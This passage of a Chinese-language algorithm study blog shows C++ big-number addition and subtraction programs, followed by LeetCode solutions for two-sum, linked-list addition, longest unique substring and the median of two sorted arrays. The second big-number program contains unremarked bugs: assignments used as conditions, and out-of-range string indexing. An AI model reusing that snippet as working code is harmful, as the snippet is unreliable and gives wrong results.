class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 两个字符串相减，模拟手算。两个字符串只有数字，没有符号</span></span><br><span class="line"><span class="function">string <span class="title">minusString</span><span class="params">(string str1, string str2)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> res_positive=<span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 若str1表示的数字小于str2的，两者交换，并将结果符号设为负。</span></span><br><span class="line">    <span class="keyword">if</span>(str1.<span class="built_in">size</span>()&lt;str2.<span class="built_in">size</span>() || (str1.<span class="built_in">size</span>()==str2.<span class="built_in">size</span>()&amp;&amp; str1&lt;str2))&#123;</span><br><span class="line">        res_positive=<span class="literal">false</span>;</span><br><span class="line">        string temp=str2;</span><br><span class="line">        str2=str1;</span><br><span class="line">        str1=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    string res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> pos1=str1.<span class="built_in">size</span>()<span class="number">-1</span>, pos2=str2.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> C=<span class="number">0</span>, num1=<span class="number">0</span>, num2=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 从后向前逐个相减</span></span><br><span class="line">    <span class="keyword">for</span>(;pos1&gt;=<span class="number">0</span>||pos2&gt;=<span class="number">0</span>; pos1--, pos2--)&#123;</span><br><span class="line">        num1=pos1&gt;=<span class="number">0</span>? str1[pos1]-<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>;</span><br><span class="line">        num2=pos2&gt;=<span class="number">0</span>? str2[pos2]-<span class="string">&#x27;0&#x27;</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1-C&lt;num2)&#123;</span><br><span class="line">            num1= num1-C+<span class="number">10</span>;</span><br><span class="line">            C=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            num1=num1-C;</span><br><span class="line">            C=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res= <span class="built_in">to_string</span>(num1-num2) + res;</span><br><span class="line">    &#125;</span><br><span class="line">    pos1=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 找到第一个非零位置</span></span><br><span class="line">    <span class="keyword">while</span>(pos1&lt;res.<span class="built_in">size</span>()&amp;&amp; res[pos1]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        pos1++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pos1==res.<span class="built_in">size</span>())&#123; <span class="comment">// res都是0</span></span><br><span class="line">        res=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pos1&gt;<span class="number">0</span>)&#123;  <span class="comment">// res前缀部分是0</span></span><br><span class="line">        res=res.<span class="built_in">substr</span>(pos1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res_positive==<span class="literal">false</span>)&#123; <span class="comment">// 结果res是负数</span></span><br><span class="line">        res= <span class="string">&quot;-&quot;</span>+res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str1, str2;</span><br><span class="line">    <span class="built_in">getline</span>(cin, str1);</span><br><span class="line">    <span class="built_in">getline</span>(cin, str2);</span><br><span class="line">    <span class="comment">// 去掉引号</span></span><br><span class="line">    str1=str1.<span class="built_in">substr</span>(<span class="number">1</span>, str1.<span class="built_in">size</span>()<span class="number">-2</span>);</span><br><span class="line">    str2=str2.<span class="built_in">substr</span>(<span class="number">1</span>, str2.<span class="built_in">size</span>()<span class="number">-2</span>);</span><br><span class="line">    <span class="comment">// 去掉正负号，记录数值正负</span></span><br><span class="line">    <span class="type">bool</span> positive1=<span class="literal">true</span>, positive2=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(str1[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        positive1=<span class="literal">false</span>;</span><br><span class="line">        str1=str1.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(str1[<span class="number">0</span>]==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        str1=str1.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(str2[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        positive2=<span class="literal">false</span>;</span><br><span class="line">        str2=str2.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(str2[<span class="number">0</span>]==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        str2=str2.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">     </span><br><span class="line">    string res;</span><br><span class="line">    <span class="comment">// 这两个字符串异号</span></span><br><span class="line">    <span class="keyword">if</span>(positive1 ^ positive2)&#123;</span><br><span class="line">        <span class="keyword">if</span>(positive1==<span class="literal">false</span>)&#123; <span class="comment">// 第一个字符串是负数</span></span><br><span class="line">            res=<span class="built_in">minusString</span>(str2, str1);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123; <span class="comment">// 第二个字符串是负数</span></span><br><span class="line">            res=<span class="built_in">minusString</span>(str1,str2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 同号</span></span><br><span class="line">        res=<span class="built_in">addString</span>(str1,str2);</span><br><span class="line">        <span class="keyword">if</span>(positive1==<span class="literal">false</span>)</span><br><span class="line">            res=<span class="string">&quot;-&quot;</span>+res;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\&quot;&quot;</span> &lt;&lt;res&lt;&lt;<span class="string">&quot;\&quot;&quot;</span>&lt;&lt;endl;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写一个大数加法的过程</span></span><br><span class="line"><span class="function">string <span class="title">Add</span><span class="params">(string str1,string str2)</span></span>&#123;</span><br><span class="line">    string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> pos1=str1.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> pos2=str2.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;pos1&gt;=<span class="number">0</span>||pos2&gt;=<span class="number">0</span>;pos1--,pos2--)&#123;</span><br><span class="line">        num1=str1[pos1]?str1[pos1]-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line">        num2=str2[pos2]?str2[pos2]-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line">        sum = num1+num2+carry;</span><br><span class="line">        carry = sum/<span class="number">10</span>;</span><br><span class="line">        res = <span class="built_in">to_string</span>(sum%<span class="number">10</span>)+res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(carry)&#123;</span><br><span class="line">    res = <span class="built_in">to_string</span>(carry)+res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//两个字符串相减的过程</span></span><br><span class="line"><span class="function">string <span class="title">minisString</span><span class="params">(string str1,string str2)</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> res_positive=<span class="literal">true</span>;<span class="comment">//先设置最后的结果是一个正数</span></span><br><span class="line">    <span class="keyword">if</span>((str1.<span class="built_in">size</span>()&lt;str2.<span class="built_in">size</span>())||(str1.<span class="built_in">size</span>()==str2.<span class="built_in">size</span>()&amp;&amp;str1&lt;str2))&#123;</span><br><span class="line">    <span class="comment">//条件判断，也就是哪一个占据主导地位</span></span><br><span class="line">        res_positive=<span class="literal">false</span>;</span><br><span class="line">        string temp=str2;</span><br><span class="line">        str2=str1;</span><br><span class="line">        str1=temp;</span><br><span class="line">        <span class="comment">//交换两个数值</span></span><br><span class="line">    &#125;</span><br><span class="line">    string res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> pos1=str1.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> pos2=str2.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> carry=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num1,num2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;pos1&gt;=<span class="number">0</span>||pos2&gt;=<span class="number">0</span>;pos1--,pos2--)&#123;</span><br><span class="line">        num1=pos1&gt;=<span class="number">0</span>?str1[pos1]-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line">        num2=pos2&gt;=<span class="number">0</span>?str2[pos2]-<span class="string">&#x27;0&#x27;</span>:<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num1-carry&lt;num2)&#123;</span><br><span class="line">          num1=num1-carry+<span class="number">10</span>;</span><br><span class="line">            carry=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            num1=num1-carry;</span><br><span class="line">            carry=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res=<span class="built_in">to_string</span>(num1-num2)+res;</span><br><span class="line">    &#125;</span><br><span class="line">    pos1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(pos1&lt;res.<span class="built_in">size</span>()&amp;&amp;res[pos1]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        pos1++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pos1==res.<span class="built_in">size</span>())&#123;</span><br><span class="line">        res=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res=res.<span class="built_in">substr</span>(pos1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(res_positive==<span class="literal">false</span>)&#123;</span><br><span class="line">    res = <span class="string">&quot;-&quot;</span>+res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str1,str2;</span><br><span class="line">    <span class="built_in">getline</span>(cin,str1);</span><br><span class="line">    <span class="built_in">getline</span>(cin,str2);</span><br><span class="line">    <span class="comment">//读取一行的字符串</span></span><br><span class="line">    str1=str1.<span class="built_in">substr</span>(<span class="number">1</span>,str1.<span class="built_in">size</span>()<span class="number">-2</span>);</span><br><span class="line">    str2=str2.<span class="built_in">substr</span>(<span class="number">1</span>,str2.<span class="built_in">size</span>()<span class="number">-2</span>);</span><br><span class="line">    <span class="comment">//去掉引号</span></span><br><span class="line">    <span class="type">bool</span> positive1=<span class="literal">true</span>,positive2=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(str1[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        positive1=<span class="literal">false</span>;</span><br><span class="line">        str1=str1.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(str2[<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        positive2=<span class="literal">false</span>;</span><br><span class="line">        str2=str2.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    string res;</span><br><span class="line">    <span class="keyword">if</span>(positive1^positive2)&#123;</span><br><span class="line">        <span class="keyword">if</span>(positive1=<span class="literal">false</span>)&#123;</span><br><span class="line">        res = <span class="built_in">minisString</span>(str2,str1);</span><br><span class="line">         <span class="comment">//也就是保证减法操作正数在前面</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(positive2=<span class="literal">false</span>)&#123;</span><br><span class="line">        res = <span class="built_in">minisString</span>(str1, str2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res = <span class="built_in">Add</span>(str1,str2);</span><br><span class="line">        <span class="keyword">if</span>(positive1==<span class="literal">false</span>)&#123;</span><br><span class="line">        res = <span class="string">&#x27;-&#x27;</span>+res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\&quot;&quot;</span>&lt;&lt;res&lt;&lt;<span class="string">&quot;\&quot;&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode(一)</title>
    <url>/2023/02/23/Leetcode/</url>
    <content><![CDATA[<h1 id="Leetcode-一"><a href="#Leetcode-一" class="headerlink" title="Leetcode(一)"></a>Leetcode(一)</h1><p>设置这一部分，一方面是复习算法知识并进行实践刷题，另一方面是复习数据结构和算法的相关知识.</p>
<font color='red'>“纸上得来终觉(浅，绝知此事要躬行.”</font>

<h4 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1.两数之和"></a>1.两数之和</h4><p>首先是一道比较简单的题，首先能想到的就是采用遍历的方式进行求解，一开始把nums.size放到for循环中了，发现这样是不优化的，需要重新定义一个变量比较好</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]+nums[j]==target)</span><br><span class="line">            <span class="keyword">return</span> &#123;i,j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这种方法还是比较简单的，但是低效，毕竟时间复杂度已经到了$N^2$,下面给出的提示中也说明了，can we use additional space somehow ,也就是用时间换空间的思想</p>
<p>Hash map,哈希表也叫散列表，提供快速的插入和查找操作，使用【键】和【关键字】的映射关系，先看了一眼答案，使用了unordered_map,auto自动类型推导，会根据后面的类型自动进行推导</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; hashmap;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = hashmap.<span class="built_in">find</span>(target-nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(it !=hashmap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;it-&gt;second,i&#125;; <span class="comment">//这个地方其实有讲究，hash表是从前往后构造的，那么查到的元素在前面</span></span><br><span class="line">            &#125;</span><br><span class="line">            hashmap[nums[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里重新复习了下哈希表，重点是找到key和value怎么配对</p>
<h4 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h4><p>两个链表存的是逆序的数，现在让两个链表相加，实话说做这个题的时候已经忘记了链表的相关知识，还是得拿起来复习一下，这个题是前序遍历链表，根据加法原理，应该设置一个链表并且包含一个进位carry，它们的和就是n1+n2+carry;当然还应该mod 10,如果两个链表的长度不同，那么认为短的链表后面是填充了一串的0</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//上面是一个链表的数据结构，存在当时的值和指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//初始化链表</span></span><br><span class="line">        ListNode* head = <span class="literal">nullptr</span>;ListNode* tail = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="type">int</span> carry = <span class="number">0</span>;<span class="comment">//设置一个进位</span></span><br><span class="line">        <span class="keyword">while</span>(l1 || l2)&#123;</span><br><span class="line">            <span class="type">int</span> num1 = l1 ? l1-&gt;val:<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> num2 = l2 ? l2-&gt;val:<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> num = num1 + num2 +carry;</span><br><span class="line">            <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">                head = tail =<span class="keyword">new</span> <span class="built_in">ListNode</span>(num%<span class="number">10</span>);</span><br><span class="line">                <span class="comment">//相加的结果,这里应该使用new开辟一段空间</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                tail-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(num%<span class="number">10</span>);</span><br><span class="line">                tail = tail-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            carry = num/<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(l1)&#123;</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l2)&#123;</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry&gt;<span class="number">0</span>)</span><br><span class="line">        tail-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面这个算法的时间复杂度显然为$O(m+n)$,毕竟需要分别遍历子序列</p>
<h4 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3.无重复字符的最长子串"></a>3.无重复字符的最长子串</h4><p>这里注意子串和子序列的区别，子串是连续的，而子序列是不连续的，一开始想用贪心做，但想了想好像不是那么回事.这个应该使用滑动窗口来解决，毕竟如果从一个元素开始的不重复序列，向右移动一个元素的子序列也是一个不重复序列，因此窗口不会收缩。接下来就是使用代码来求解问题的过程，这里的问题是如何来排除重复的元素，之前确实不经常使用，这里其实用到了unordered_set.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//这里使用unordered_set来排除相同元素</span></span><br><span class="line">        unordered_set&lt;<span class="type">char</span>&gt; Strset;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> rk = <span class="number">-1</span>;<span class="comment">//用来记录右边界，开始为0</span></span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="comment">//i最后得提升</span></span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)&#123;</span><br><span class="line">                Strset.<span class="built_in">erase</span>(s[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(rk+<span class="number">1</span>&lt;n&amp;&amp;!Strset.<span class="built_in">count</span>(s[rk+<span class="number">1</span>]))&#123;</span><br><span class="line">                <span class="comment">//rk+1不能越界</span></span><br><span class="line">                Strset.<span class="built_in">insert</span>(s[rk+<span class="number">1</span>]);</span><br><span class="line">                ++rk;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans,rk-i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4.寻找两个正序数组的中位数"></a>4.寻找两个正序数组的中位数</h4><p>寻找两个正序数组的中位数，算法的时间复杂度为$O(log(m+n))$,首先不能用排序，排序的话至少$nlogn$起步，那这个很可能就是两个分别进行二分查找，一开始我想到的是分治，各找一半，但是在取整问题上不能理清思路</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230223203136536.png" alt="image-20230223203136536"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230223203407699.png" alt="image-20230223203407699"></p>
<p>这个算法也就是定下来排除的数据，如果是奇数，也就是最后一个排除的数字，如果是偶数那么就是两个排除数的平均值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getKthElement</span><span class="params">(<span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">const</span> vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* 主要思路：要找到第 k (k&gt;1) 小的元素，那么就取 pivot1 = nums1[k/2-1] 和 pivot2 = nums2[k/2-1] 进行比较</span></span><br><span class="line"><span class="comment">         * 这里的 &quot;/&quot; 表示整除</span></span><br><span class="line"><span class="comment">         * nums1 中小于等于 pivot1 的元素有 nums1[0 .. k/2-2] 共计 k/2-1 个</span></span><br><span class="line"><span class="comment">         * nums2 中小于等于 pivot2 的元素有 nums2[0 .. k/2-2] 共计 k/2-1 个</span></span><br><span class="line"><span class="comment">         * 取 pivot = min(pivot1, pivot2)，两个数组中小于等于 pivot 的元素共计不会超过 (k/2-1) + (k/2-1) &lt;= k-2 个</span></span><br><span class="line"><span class="comment">         * 这样 pivot 本身最大也只能是第 k-1 小的元素</span></span><br><span class="line"><span class="comment">         * 如果 pivot = pivot1，那么 nums1[0 .. k/2-1] 都不可能是第 k 小的元素。把这些元素全部 &quot;删除&quot;，剩下的作为新的 nums1 数组</span></span><br><span class="line"><span class="comment">         * 如果 pivot = pivot2，那么 nums2[0 .. k/2-1] 都不可能是第 k 小的元素。把这些元素全部 &quot;删除&quot;，剩下的作为新的 nums2 数组</span></span><br><span class="line"><span class="comment">         * 由于我们 &quot;删除&quot; 了一些元素（这些元素都比第 k 小的元素要小），因此需要修改 k 的值，减去删除的数的个数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> index1 = <span class="number">0</span>, index2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 边界情况</span></span><br><span class="line">            <span class="keyword">if</span> (index1 == m) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index2 == n) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">min</span>(nums1[index1], nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 正常情况</span></span><br><span class="line">            <span class="type">int</span> newIndex1 = <span class="built_in">min</span>(index1 + k / <span class="number">2</span> - <span class="number">1</span>, m - <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> newIndex2 = <span class="built_in">min</span>(index2 + k / <span class="number">2</span> - <span class="number">1</span>, n - <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> pivot1 = nums1[newIndex1];</span><br><span class="line">            <span class="type">int</span> pivot2 = nums2[newIndex2];</span><br><span class="line">            <span class="keyword">if</span> (pivot1 &lt;= pivot2) &#123;</span><br><span class="line">                k -= newIndex1 - index1 + <span class="number">1</span>;</span><br><span class="line">                index1 = newIndex1 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= newIndex2 - index2 + <span class="number">1</span>;</span><br><span class="line">                index2 = newIndex2 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> totalLength = nums1.<span class="built_in">size</span>() + nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (totalLength % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getKthElement</span>(nums1, nums2, (totalLength + <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">return</span> (<span class="built_in">getKthElement</span>(nums1, nums2, totalLength / <span class="number">2</span>) + <span class="built_in">getKthElement</span>(nums1, nums2, totalLength / <span class="number">2</span> + <span class="number">1</span>)) / <span class="number">2.0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">作者：LeetCode-Solution</span><br><span class="line">链接：https:<span class="comment">//leetcode.cn/problems/median-of-two-sorted-arrays/solution/xun-zhao-liang-ge-you-xu-shu-zu-de-zhong-wei-s-114/</span></span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>
<p>ps.排序算法的稳定性，也就是值相同的元素排序完之后能否保持相对的位置不变</p>
<p>稳定性有用的情况，经过了两轮的排序，第一轮排序年龄，第二轮排序班级，这样班级内部的年龄也是有序的</p>
<p>选择排序不能做到稳定性</p>
